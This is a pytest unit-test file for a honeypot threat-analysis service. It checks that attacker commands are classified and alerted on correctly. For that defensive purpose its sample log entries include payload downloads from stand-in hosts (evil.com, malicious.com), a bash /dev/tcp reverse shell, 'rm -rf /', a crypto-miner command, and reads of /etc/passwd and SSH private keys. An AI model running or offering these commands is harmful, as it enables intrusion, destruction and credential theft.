"""
Unit tests for ThreatAnalyzer service.
"""

import pytest
from datetime import datetime, timedelta
from unittest.mock import Mock, patch
from src.honeypot_monitor.services.threat_analyzer import ThreatAnalyzer
from src.honeypot_monitor.models.log_entry import LogEntry
from src.honeypot_monitor.models.threat_assessment import ThreatAssessment
from src.honeypot_monitor.config.settings import AnalysisSettings


class TestThreatAnalyzer:
    """Test cases for ThreatAnalyzer class."""
    
    @pytest.fixture
    def analysis_settings(self):
        """Create test analysis settings."""
        return AnalysisSettings(
            threat_threshold='medium',
            custom_rules_path='./test_rules/'
        )
    
    @pytest.fixture
    def analyzer(self, analysis_settings):
        """Create ThreatAnalyzer instance for testing."""
        return ThreatAnalyzer(analysis_settings)
    
    @pytest.fixture
    def sample_log_entry(self):
        """Create a sample log entry for testing."""
        return LogEntry(
            timestamp=datetime.now(),
            session_id='test_session_001',
            event_type='command',
            source_ip='192.168.1.100',
            message='User executed command: whoami',
            command='whoami'
        )
    
    def test_analyzer_initialization(self, analyzer, analysis_settings):
        """Test ThreatAnalyzer initialization."""
        assert analyzer.settings == analysis_settings
        assert isinstance(analyzer._ip_activity_tracker, dict)
        assert isinstance(analyzer._session_tracker, dict)
        assert isinstance(analyzer._command_patterns, dict)
        assert isinstance(analyzer._threat_indicators, dict)
    
    def test_analyze_entry_basic_command(self, analyzer, sample_log_entry):
        """Test basic command analysis."""
        assessment = analyzer.analyze_entry(sample_log_entry)
        
        assert isinstance(assessment, ThreatAssessment)
        assert assessment.severity in ['low', 'medium', 'high', 'critical']
        assert assessment.category in ['reconnaissance', 'exploitation', 'persistence', 'lateral_movement', 'unknown']
        assert 0.0 <= assessment.confidence <= 1.0
        assert isinstance(assessment.indicators, list)
        assert isinstance(assessment.recommended_action, str)
    
    def test_analyze_reconnaissance_command(self, analyzer):
        """Test analysis of reconnaissance commands."""
        recon_commands = ['whoami', 'id', 'uname -a', 'ps aux', 'netstat -an', 'ifconfig']
        
        for command in recon_commands:
            entry = LogEntry(
                timestamp=datetime.now(),
                session_id='test_session',
                event_type='command',
                source_ip='192.168.1.100',
                message=f'User executed command: {command}',
                command=command
            )
            
            assessment = analyzer.analyze_entry(entry)
            assert assessment.category == 'reconnaissance'
            assert assessment.severity in ['low', 'medium']
            assert len(assessment.indicators) > 0
    
    def test_analyze_exploitation_command(self, analyzer):
        """Test analysis of exploitation commands."""
        exploit_commands = [
            'sudo su -',
            'chmod 777 /etc/passwd',
            'wget http://malicious.com/backdoor.sh',
            'curl -o /tmp/exploit http://evil.com/payload'
        ]
        
        for command in exploit_commands:
            entry = LogEntry(
                timestamp=datetime.now(),
                session_id='test_session',
                event_type='command',
                source_ip='192.168.1.100',
                message=f'User executed command: {command}',
                command=command
            )
            
            assessment = analyzer.analyze_entry(entry)
            assert assessment.category in ['exploitation', 'persistence']
            assert assessment.severity in ['medium', 'high', 'critical']
            assert assessment.confidence >= 0.7
    
    def test_analyze_persistence_command(self, analyzer):
        """Test analysis of persistence commands."""
        persistence_commands = [
            'crontab -e',
            'echo "backdoor" >> ~/.bashrc',
            'systemctl enable malicious.service',
            'ssh-keygen -t rsa'
        ]
        
        for command in persistence_commands:
            entry = LogEntry(
                timestamp=datetime.now(),
                session_id='test_session',
                event_type='command',
                source_ip='192.168.1.100',
                message=f'User executed command: {command}',
                command=command
            )
            
            assessment = analyzer.analyze_entry(entry)
            assert assessment.category == 'persistence'
            assert assessment.severity in ['medium', 'high', 'critical']
    
    def test_analyze_lateral_movement_command(self, analyzer):
        """Test analysis of lateral movement commands."""
        lateral_commands = [
            'ssh user@192.168.1.50',
            'scp file.txt user@10.0.0.1:/tmp/',
            'ping 192.168.1.1',
            'arp -a'
        ]
        
        for command in lateral_commands:
            entry = LogEntry(
                timestamp=datetime.now(),
                session_id='test_session',
                event_type='command',
                source_ip='192.168.1.100',
                message=f'User executed command: {command}',
                command=command
            )
            
            assessment = analyzer.analyze_entry(entry)
            assert assessment.category == 'lateral_movement'
            assert assessment.severity in ['medium', 'high']
    
    def test_analyze_event_types(self, analyzer):
        """Test analysis of different event types."""
        event_types = [
            ('authentication', 'reconnaissance', 'low'),
            ('login', 'reconnaissance', 'medium'),
            ('command', 'reconnaissance', 'low'),
            ('file_access', 'reconnaissance', 'medium')
        ]
        
        for event_type, expected_category, expected_severity in event_types:
            entry = LogEntry(
                timestamp=datetime.now(),
                session_id='test_session',
                event_type=event_type,
                source_ip='192.168.1.100',
                message=f'Event: {event_type}'
            )
            
            assessment = analyzer.analyze_entry(entry)
            # Note: Command patterns might override event type assessment
            assert assessment.severity in ['low', 'medium', 'high', 'critical']
            assert assessment.category in ['reconnaissance', 'exploitation', 'persistence', 'lateral_movement', 'unknown']
    
    def test_ip_behavior_analysis_rapid_activity(self, analyzer):
        """Test IP behavior analysis for rapid activity."""
        base_time = datetime.now()
        source_ip = '192.168.1.100'
        
        # Create multiple entries from same IP in short time
        for i in range(15):
            entry = LogEntry(
                timestamp=base_time + timedelta(seconds=i * 10),
                session_id=f'session_{i}',
                event_type='command',
                source_ip=source_ip,
                message=f'Command {i}',
                command=f'ls {i}'
            )
            analyzer.analyze_entry(entry)
        
        # The last entry should trigger rapid activity detection
        final_entry = LogEntry(
            timestamp=base_time + timedelta(seconds=150),
            session_id='final_session',
            event_type='command',
            source_ip=source_ip,
            message='Final command',
            command='whoami'
        )
        
        assessment = analyzer.analyze_entry(final_entry)
        assert assessment.severity in ['medium', 'high']
        assert any('Rapid activity' in indicator or 'activity' in indicator for indicator in assessment.indicators)
    
    def test_detect_patterns_empty_list(self, analyzer):
        """Test pattern detection with empty entry list."""
        patterns = analyzer.detect_patterns([])
        assert patterns == []
    
    def test_detect_brute_force_patterns(self, analyzer):
        """Test brute force pattern detection."""
        base_time = datetime.now()
        source_ip = '192.168.1.100'
        
        # Create multiple failed authentication attempts
        entries = []
        for i in range(8):
            entry = LogEntry(
                timestamp=base_time + timedelta(seconds=i * 30),
                session_id=f'session_{i}',
                event_type='authentication',
                source_ip=source_ip,
                message='Authentication failed for user admin'
            )
            entries.append(entry)
        
        patterns = analyzer.detect_patterns(entries)
        
        # Should detect brute force pattern
        brute_force_patterns = [p for p in patterns if p['type'] == 'brute_force_attack']
        assert len(brute_force_patterns) > 0
        
        pattern = brute_force_patterns[0]
        assert pattern['source_ip'] == source_ip
        assert pattern['severity'] == 'high'
        assert pattern['confidence'] >= 0.8
        assert pattern['entry_count'] >= 5
    
    def test_detect_reconnaissance_sequence(self, analyzer):
        """Test reconnaissance sequence detection."""
        base_time = datetime.now()
        session_id = 'recon_session'
        source_ip = '192.168.1.100'
        
        recon_commands = ['whoami', 'id', 'uname -a', 'ps aux', 'netstat -an']
        entries = []
        
        for i, command in enumerate(recon_commands):
            entry = LogEntry(
                timestamp=base_time + timedelta(seconds=i * 10),
                session_id=session_id,
                event_type='command',
                source_ip=source_ip,
                message=f'Command executed: {command}',
                command=command
            )
            entries.append(entry)
        
        patterns = analyzer.detect_patterns(entries)
        
        # Should detect reconnaissance sequence
        recon_patterns = [p for p in patterns if p['type'] == 'reconnaissance_sequence']
        assert len(recon_patterns) > 0
        
        pattern = recon_patterns[0]
        assert pattern['session_id'] == session_id
        assert pattern['source_ip'] == source_ip
        assert pattern['severity'] == 'medium'
        assert pattern['recon_count'] >= 3
    
    def test_detect_privilege_escalation_sequence(self, analyzer):
        """Test privilege escalation sequence detection."""
        base_time = datetime.now()
        session_id = 'priv_session'
        source_ip = '192.168.1.100'
        
        priv_commands = ['sudo su -', 'passwd root', 'chmod 777 /etc/passwd']
        entries = []
        
        for i, command in enumerate(priv_commands):
            entry = LogEntry(
                timestamp=base_time + timedelta(seconds=i * 15),
                session_id=session_id,
                event_type='command',
                source_ip=source_ip,
                message=f'Command executed: {command}',
                command=command
            )
            entries.append(entry)
        
        patterns = analyzer.detect_patterns(entries)
        
        # Should detect privilege escalation sequence
        priv_patterns = [p for p in patterns if p['type'] == 'privilege_escalation_sequence']
        assert len(priv_patterns) > 0
        
        pattern = priv_patterns[0]
        assert pattern['session_id'] == session_id
        assert pattern['severity'] == 'high'
        assert pattern['priv_count'] >= 2
    
    def test_detect_burst_activity(self, analyzer):
        """Test burst activity detection."""
        base_time = datetime.now()
        source_ip = '192.168.1.100'
        
        # Create burst of 25 entries in 3 minutes
        entries = []
        for i in range(25):
            entry = LogEntry(
                timestamp=base_time + timedelta(seconds=i * 7),  # Every 7 seconds
                session_id=f'session_{i}',
                event_type='command',
                source_ip=source_ip,
                message=f'Command {i}',
                command=f'ls {i}'
            )
            entries.append(entry)
        
        patterns = analyzer.detect_patterns(entries)
        
        # Should detect burst activity
        burst_patterns = [p for p in patterns if p['type'] == 'burst_activity']
        assert len(burst_patterns) > 0
        
        pattern = burst_patterns[0]
        assert pattern['severity'] == 'medium'
        assert pattern['event_count'] >= 20
    
    def test_detect_repeat_offenders(self, analyzer):
        """Test repeat offender detection."""
        base_time = datetime.now()
        source_ip = '192.168.1.100'
        
        # Create many entries over long time period
        entries = []
        for i in range(60):
            entry = LogEntry(
                timestamp=base_time + timedelta(minutes=i * 2),  # Every 2 minutes for 2 hours
                session_id=f'session_{i}',
                event_type='command',
                source_ip=source_ip,
                message=f'Command {i}',
                command=f'ls {i}'
            )
            entries.append(entry)
        
        patterns = analyzer.detect_patterns(entries)
        
        # Should detect repeat offender
        repeat_patterns = [p for p in patterns if p['type'] == 'repeat_offender']
        assert len(repeat_patterns) > 0
        
        pattern = repeat_patterns[0]
        assert pattern['source_ip'] == source_ip
        assert pattern['severity'] == 'medium'
        assert pattern['event_count'] >= 50
        assert pattern['time_span_hours'] > 1.0
    
    def test_apply_custom_rules_suspicious_command(self, analyzer):
        """Test custom rules for suspicious commands."""
        suspicious_entry = LogEntry(
            timestamp=datetime.now(),
            session_id='test_session',
            event_type='command',
            source_ip='192.168.1.100',
            message='User executed dangerous command',
            command='rm -rf /'
        )
        
        alerts = analyzer.apply_custom_rules(suspicious_entry)
        
        # Should generate alert for suspicious command
        assert len(alerts) > 0
        alert = alerts[0]
        assert 'destructive_commands' in alert['rule_name']
        assert alert['severity'] == 'critical'
        assert alert['source_ip'] == '192.168.1.100'
    
    def test_apply_custom_rules_sensitive_file_access(self, analyzer):
        """Test custom rules for sensitive file access."""
        sensitive_entry = LogEntry(
            timestamp=datetime.now(),
            session_id='test_session',
            event_type='file_access',
            source_ip='192.168.1.100',
            message='File accessed: /etc/passwd',
            file_path='/etc/passwd'
        )
        
        alerts = analyzer.apply_custom_rules(sensitive_entry)
        
        # Should generate alert for sensitive file access
        assert len(alerts) > 0
        alert = alerts[0]
        assert 'system_credentials' in alert['rule_name']
        assert alert['severity'] == 'high'
        assert '/etc/passwd' in alert['description']
    
    def test_apply_custom_rules_no_alerts(self, analyzer):
        """Test custom rules with benign entry."""
        benign_entry = LogEntry(
            timestamp=datetime.now(),
            session_id='test_session',
            event_type='command',
            source_ip='192.168.1.100',
            message='User executed benign command',
            command='echo hello'
        )
        
        alerts = analyzer.apply_custom_rules(benign_entry)
        
        # Should not generate any alerts
        assert len(alerts) == 0
    
    def test_get_severity_score(self, analyzer):
        """Test severity score conversion."""
        assert analyzer._get_severity_score('low') == 1
        assert analyzer._get_severity_score('medium') == 2
        assert analyzer._get_severity_score('high') == 3
        assert analyzer._get_severity_score('critical') == 4
        assert analyzer._get_severity_score('unknown') == 0
    
    def test_cleanup_old_entries(self, analyzer):
        """Test cleanup of old entries."""
        old_time = datetime.now() - timedelta(hours=25)  # Older than 24 hours
        recent_time = datetime.now()
        
        # Add old entry
        old_entry = LogEntry(
            timestamp=old_time,
            session_id='old_session',
            event_type='command',
            source_ip='192.168.1.100',
            message='Old command',
            command='old_command'
        )
        analyzer.analyze_entry(old_entry)
        
        # Add recent entry
        recent_entry = LogEntry(
            timestamp=recent_time,
            session_id='recent_session',
            event_type='command',
            source_ip='192.168.1.100',
            message='Recent command',
            command='recent_command'
        )
        analyzer.analyze_entry(recent_entry)
        
        # Force cleanup
        analyzer._cleanup_old_entries()
        
        # Old entries should be removed, recent ones should remain
        ip_entries = analyzer._ip_activity_tracker.get('192.168.1.100', [])
        assert len(ip_entries) == 1
        assert ip_entries[0].session_id == 'recent_session'
    
    def test_get_threat_statistics(self, analyzer):
        """Test threat statistics generation."""
        # Add some test entries
        entries = [
            LogEntry(
                timestamp=datetime.now(),
                session_id=f'session_{i}',
                event_type='command',
                source_ip=f'192.168.1.{100 + i}',
                message=f'Command {i}',
                command='whoami'
            )
            for i in range(5)
        ]
        
        for entry in entries:
            analyzer.analyze_entry(entry)
        
        stats = analyzer.get_threat_statistics()
        
        assert 'total_ips_tracked' in stats
        assert 'total_sessions_tracked' in stats
        assert 'threat_categories' in stats
        assert 'severity_distribution' in stats
        assert 'top_source_ips' in stats
        assert 'most_active_sessions' in stats
        
        assert stats['total_ips_tracked'] == 5
        assert stats['total_sessions_tracked'] == 5
        assert len(stats['top_source_ips']) <= 10
        assert len(stats['most_active_sessions']) <= 10
    
    def test_track_entry(self, analyzer, sample_log_entry):
        """Test entry tracking functionality."""
        analyzer._track_entry(sample_log_entry)
        
        # Check IP tracking
        assert sample_log_entry.source_ip in analyzer._ip_activity_tracker
        ip_entries = analyzer._ip_activity_tracker[sample_log_entry.source_ip]
        assert len(ip_entries) == 1
        assert ip_entries[0] == sample_log_entry
        
        # Check session tracking
        assert sample_log_entry.session_id in analyzer._session_tracker
        session_entries = analyzer._session_tracker[sample_log_entry.session_id]
        assert len(session_entries) == 1
        assert session_entries[0] == sample_log_entry
    
    def test_analyze_command_patterns_no_match(self, analyzer):
        """Test command pattern analysis with no matches."""
        result = analyzer._analyze_command_patterns('echo hello world')
        assert result is None
    
    def test_analyze_command_patterns_multiple_matches(self, analyzer):
        """Test command pattern analysis with multiple matches."""
        # Command that matches multiple patterns
        result = analyzer._analyze_command_patterns('sudo wget http://malicious.com/backdoor')
        
        # Should return the highest severity match
        assert result is not None
        assert result['severity'] in ['medium', 'high', 'critical']
        assert result['confidence'] > 0.0
        assert len(result['indicators']) > 0
    
    def test_analyze_ip_behavior_insufficient_data(self, analyzer):
        """Test IP behavior analysis with insufficient data."""
        entry = LogEntry(
            timestamp=datetime.now(),
            session_id='test_session',
            event_type='command',
            source_ip='192.168.1.100',
            message='Single command',
            command='whoami'
        )
        
        result = analyzer._analyze_ip_behavior(entry)
        assert result is None
    
    def test_command_patterns_initialization(self, analyzer):
        """Test that command patterns are properly initialized."""
        patterns = analyzer._command_patterns
        
        # Check that key pattern categories exist
        assert 'system_enumeration' in patterns
        assert 'network_scanning' in patterns
        assert 'privilege_escalation' in patterns
        assert 'malware_download' in patterns
        assert 'backdoor_creation' in patterns
        assert 'file_modification' in patterns
        assert 'lateral_movement' in patterns
        
        # Check pattern structure
        for pattern_name, pattern_info in patterns.items():
            assert 'patterns' in pattern_info
            assert 'category' in pattern_info
            assert 'severity' in pattern_info
            assert 'confidence' in pattern_info
            assert isinstance(pattern_info['patterns'], list)
            assert len(pattern_info['patterns']) > 0
    
    def test_threat_indicators_initialization(self, analyzer):
        """Test that threat indicators are properly initialized."""
        indicators = analyzer._threat_indicators
        
        # Check that key indicators exist
        assert 'brute_force_indicators' in indicators
        assert 'rapid_commands' in indicators
        assert 'suspicious_files' in indicators
        assert 'known_malicious_ips' in indicators
        
        # Check indicator structure
        for indicator_name, indicator_info in indicators.items():
            assert isinstance(indicator_info, dict)
            assert 'severity' in indicator_info
            assert 'confidence' in indicator_info


    def test_apply_command_rules_destructive(self, analyzer):
        """Test custom command rules for destructive commands."""
        destructive_entry = LogEntry(
            timestamp=datetime.now(),
            session_id='test_session',
            event_type='command',
            source_ip='192.168.1.100',
            message='Destructive command executed',
            command='rm -rf /'
        )
        
        alerts = analyzer._apply_command_rules(destructive_entry)
        
        assert len(alerts) > 0
        alert = alerts[0]
        assert 'destructive' in alert['rule_name']
        assert alert['severity'] == 'critical'
        assert alert['confidence'] >= 0.9
    
    def test_apply_command_rules_crypto_mining(self, analyzer):
        """Test custom command rules for crypto mining detection."""
        mining_entry = LogEntry(
            timestamp=datetime.now(),
            session_id='test_session',
            event_type='command',
            source_ip='192.168.1.100',
            message='Mining command executed',
            command='xmrig --algo=rx/0 --pool=stratum+tcp://pool.com:4444'
        )
        
        alerts = analyzer._apply_command_rules(mining_entry)
        
        assert len(alerts) > 0
        alert = alerts[0]
        assert 'crypto_mining' in alert['rule_name']
        assert alert['severity'] == 'high'
    
    def test_apply_command_rules_reverse_shell(self, analyzer):
        """Test custom command rules for reverse shell detection."""
        shell_entry = LogEntry(
            timestamp=datetime.now(),
            session_id='test_session',
            event_type='command',
            source_ip='192.168.1.100',
            message='Reverse shell command',
            command='bash -i >& /dev/tcp/192.168.1.1/4444 0>&1'
        )
        
        alerts = analyzer._apply_command_rules(shell_entry)
        
        assert len(alerts) > 0
        alert = alerts[0]
        assert 'reverse_shells' in alert['rule_name']
        assert alert['severity'] == 'critical'
    
    def test_apply_file_access_rules_ssh_keys(self, analyzer):
        """Test custom file access rules for SSH keys."""
        ssh_entry = LogEntry(
            timestamp=datetime.now(),
            session_id='test_session',
            event_type='file_access',
            source_ip='192.168.1.100',
            message='SSH key access',
            file_path='/root/.ssh/id_rsa'
        )
        
        alerts = analyzer._apply_file_access_rules(ssh_entry)
        
        assert len(alerts) > 0
        alert = alerts[0]
        assert 'ssh_keys' in alert['rule_name']
        assert alert['severity'] == 'high'
        assert '/root/.ssh/id_rsa' in alert['description']
    
    def test_apply_file_access_rules_database_files(self, analyzer):
        """Test custom file access rules for database files."""
        db_entry = LogEntry(
            timestamp=datetime.now(),
            session_id='test_session',
            event_type='file_access',
            source_ip='192.168.1.100',
            message='Database file access',
            file_path='/var/lib/mysql/users.db'
        )
        
        alerts = analyzer._apply_file_access_rules(db_entry)
        
        assert len(alerts) > 0
        alert = alerts[0]
        assert 'database_files' in alert['rule_name']
        assert alert['severity'] == 'high'
    
    def test_apply_behavioral_rules_rapid_sessions(self, analyzer):
        """Test behavioral rules for rapid session creation."""
        base_time = datetime.now()
        source_ip = '192.168.1.100'
        
        # Create multiple sessions in short time
        for i in range(6):
            entry = LogEntry(
                timestamp=base_time + timedelta(seconds=i * 30),
                session_id=f'rapid_session_{i}',
                event_type='login',
                source_ip=source_ip,
                message=f'Login {i}'
            )
            analyzer._track_entry(entry)
        
        # Test with final entry
        final_entry = LogEntry(
            timestamp=base_time + timedelta(seconds=180),
            session_id='final_rapid_session',
            event_type='command',
            source_ip=source_ip,
            message='Final command',
            command='whoami'
        )
        
        alerts = analyzer._apply_behavioral_rules(final_entry)
        
        # Should detect rapid session creation
        rapid_alerts = [a for a in alerts if 'rapid_sessions' in a['rule_name']]
        assert len(rapid_alerts) > 0
        
        alert = rapid_alerts[0]
        assert alert['severity'] == 'medium'
        assert alert['session_count'] >= 5
    
    def test_apply_behavioral_rules_command_diversity(self, analyzer):
        """Test behavioral rules for high command diversity."""
        session_id = 'diverse_session'
        source_ip = '192.168.1.100'
        base_time = datetime.now()
        
        # Create many different commands
        diverse_commands = [
            'whoami', 'id', 'uname', 'ps', 'netstat', 'ifconfig', 'ls', 'cat', 'grep', 'find',
            'locate', 'which', 'whereis', 'top', 'htop', 'df', 'du', 'mount', 'lsof', 'ss',
            'iptables', 'route', 'ping', 'traceroute', 'nslookup'
        ]
        
        for i, command in enumerate(diverse_commands):
            entry = LogEntry(
                timestamp=base_time + timedelta(seconds=i * 5),
                session_id=session_id,
                event_type='command',
                source_ip=source_ip,
                message=f'Command: {command}',
                command=command
            )
            analyzer._track_entry(entry)
        
        # Test with final entry
        final_entry = LogEntry(
            timestamp=base_time + timedelta(seconds=len(diverse_commands) * 5),
            session_id=session_id,
            event_type='command',
            source_ip=source_ip,
            message='Final diverse command',
            command='echo test'
        )
        
        alerts = analyzer._apply_behavioral_rules(final_entry)
        
        # Should detect high command diversity
        diversity_alerts = [a for a in alerts if 'command_diversity' in a['rule_name']]
        assert len(diversity_alerts) > 0
        
        alert = diversity_alerts[0]
        assert alert['severity'] == 'medium'
        assert alert['unique_commands'] >= 20
    
    def test_detect_suspicious_command_sequences(self, analyzer):
        """Test detection of suspicious command sequences."""
        base_time = datetime.now()
        session_id = 'attack_session'
        source_ip = '192.168.1.100'
        
        # Create attack sequence: reconnaissance -> exploitation
        attack_commands = [
            'whoami',           # enumeration
            'id',               # enumeration  
            'find / -name "*.conf"',  # vulnerability_scan
            'sudo su -',        # exploit
            'wget http://evil.com/backdoor.sh'  # exploit
        ]
        
        entries = []
        for i, command in enumerate(attack_commands):
            entry = LogEntry(
                timestamp=base_time + timedelta(seconds=i * 30),
                session_id=session_id,
                event_type='command',
                source_ip=source_ip,
                message=f'Attack command: {command}',
                command=command
            )
            entries.append(entry)
        
        sequences = analyzer.detect_suspicious_command_sequences(entries)
        
        # Should detect attack sequence
        attack_sequences = [s for s in sequences if s['type'] == 'attack_sequence']
        assert len(attack_sequences) > 0
        
        sequence = attack_sequences[0]
        assert sequence['session_id'] == session_id
        assert sequence['source_ip'] == source_ip
        assert sequence['severity'] in ['high', 'critical']
        assert len(sequence['indicators']) >= 2
    
    def test_match_command_sequence_full_match(self, analyzer):
        """Test command sequence matching with full pattern match."""
        commands = ['whoami', 'find / -name passwd', 'sudo su -']
        pattern_info = {
            'pattern': ['enumeration', 'vulnerability_scan', 'exploit'],
            'commands': {
                'enumeration': ['whoami', 'id'],
                'vulnerability_scan': ['find', 'locate'],
                'exploit': ['sudo', 'su']
            }
        }
        
        result = analyzer._match_command_sequence(commands, pattern_info)
        
        assert result['matched'] == True
        assert len(result['matched_stages']) == 3
        assert 'enumeration' in result['matched_stages']
        assert 'vulnerability_scan' in result['matched_stages']
        assert 'exploit' in result['matched_stages']
    
    def test_match_command_sequence_partial_match(self, analyzer):
        """Test command sequence matching with partial pattern match."""
        commands = ['whoami', 'ls -la']
        pattern_info = {
            'pattern': ['enumeration', 'vulnerability_scan', 'exploit'],
            'commands': {
                'enumeration': ['whoami', 'id'],
                'vulnerability_scan': ['find', 'locate'],
                'exploit': ['sudo', 'su']
            }
        }
        
        result = analyzer._match_command_sequence(commands, pattern_info)
        
        assert result['matched'] == False  # Only 1 stage matched, need at least 2
        assert len(result['matched_stages']) == 1
    
    def test_track_repeat_offenders(self, analyzer):
        """Test repeat offender tracking."""
        base_time = datetime.now()
        source_ip = '192.168.1.100'
        
        # Create many entries for repeat offender - need more entries and sessions to trigger threat score
        for i in range(120):  # Increased to trigger high activity volume
            entry = LogEntry(
                timestamp=base_time + timedelta(minutes=i * 2),  # Spread over 4 hours
                session_id=f'session_{i % 15}',  # Multiple sessions to trigger indicator
                event_type='authentication' if i % 10 == 0 else 'command',  # Mix of event types
                source_ip=source_ip,
                message=f'Command {i}',
                command=f'command_{i}' if i % 10 != 0 else None
            )
            analyzer._track_entry(entry)
        
        repeat_offenders = analyzer.track_repeat_offenders()
        
        # Should identify the IP as repeat offender
        assert len(repeat_offenders) > 0
        
        offender = repeat_offenders[0]
        assert offender['ip'] == source_ip
        assert offender['threat_score'] >= 0.7  # Should meet threshold now
        assert offender['total_entries'] >= 100
        assert len(offender['threat_indicators']) > 0
    
    def test_analyze_ip_profile_high_threat(self, analyzer):
        """Test IP profile analysis for high threat IP."""
        base_time = datetime.now()
        source_ip = '192.168.1.100'
        
        # Create high-threat activity pattern
        entries = []
        for i in range(150):  # High volume
            entry = LogEntry(
                timestamp=base_time + timedelta(seconds=i * 30),
                session_id=f'session_{i % 20}',  # Multiple sessions
                event_type='authentication' if i % 5 == 0 else 'command',
                source_ip=source_ip,
                message=f'Activity {i}',
                command=f'unique_command_{i}' if i % 5 != 0 else None
            )
            entries.append(entry)
        
        profile = analyzer._analyze_ip_profile(source_ip, entries)
        
        assert profile['ip'] == source_ip
        assert profile['threat_score'] > 0.7  # High threat score
        assert profile['total_entries'] == 150
        assert 'High activity volume' in profile['threat_indicators']
        assert 'Multiple sessions' in profile['threat_indicators']
        assert 'High command diversity' in profile['threat_indicators']
    
    def test_analyze_ip_profile_low_threat(self, analyzer):
        """Test IP profile analysis for low threat IP."""
        base_time = datetime.now()
        source_ip = '192.168.1.100'
        
        # Create low-threat activity pattern
        entries = []
        for i in range(5):  # Low volume
            entry = LogEntry(
                timestamp=base_time + timedelta(minutes=i * 10),
                session_id='single_session',
                event_type='command',
                source_ip=source_ip,
                message=f'Benign activity {i}',
                command='ls'
            )
            entries.append(entry)
        
        profile = analyzer._analyze_ip_profile(source_ip, entries)
        
        assert profile['ip'] == source_ip
        assert profile['threat_score'] < 0.5  # Low threat score
        assert profile['total_entries'] == 5
        assert len(profile['threat_indicators']) == 0  # No threat indicators
    
    def test_load_custom_rules_from_file_missing_file(self, analyzer, tmp_path):
        """Test loading custom rules from non-existent file."""
        non_existent_file = tmp_path / "missing_rules.yaml"
        
        result = analyzer.load_custom_rules_from_file(str(non_existent_file))
        
        assert result == False
    
    def test_export_threat_rules(self, analyzer, tmp_path):
        """Test exporting threat rules to file."""
        output_file = tmp_path / "exported_rules.yaml"
        
        result = analyzer.export_threat_rules(str(output_file))
        
        assert result == True
        assert output_file.exists()
        
        # Verify file content
        import yaml
        with open(output_file, 'r') as file:
            exported_data = yaml.safe_load(file)
        
        assert 'command_patterns' in exported_data
        assert 'threat_indicators' in exported_data
        assert len(exported_data['command_patterns']) > 0
        assert len(exported_data['threat_indicators']) > 0


if __name__ == '__main__':
    pytest.main([__file__])